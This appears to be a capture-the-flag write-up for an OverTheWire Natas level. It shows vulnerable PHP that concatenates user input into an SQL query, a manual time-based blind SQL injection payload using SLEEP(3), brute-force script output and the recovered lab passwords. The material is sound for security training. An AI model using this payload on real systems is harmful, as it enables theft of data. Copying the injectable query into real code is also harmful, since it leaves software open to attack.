# Natas Level 16 → Level 17 Time Based Blind SQL Injection

## Previous Flag
<b>EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC</b>

## Goal
Username: natas17<br>
URL: http://natas17.natas.labs.overthewire.org<br>

Username:<br>
Check existence

## What I learned
```
No visible output so need something as an indicator such as time so we know server responding back
```

## Solution
```
Click View source code
http://natas17.natas.labs.overthewire.org/index-source.html

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas17", "pass": "<censored>" };</script></head>
<body>
<h1>natas17</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas17', '<censored>');
    mysqli_select_db($link, 'natas17');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 👀
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

# Manual Time based attack: server pauses 3 sec
Username: natas18" AND SLEEP(3) --" ⌨️

# Pure brute force
@trungdullc ➜ /workspaces/01noobHacker (main) $ python3 scripts/timebasedsqlinjection.py ⌨️
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCF
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCG
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCH
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCI
Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
Password found: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ 🔐
```

## Flag
<b>6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ</b>

## Continue
[Continue](./Natas1718.md)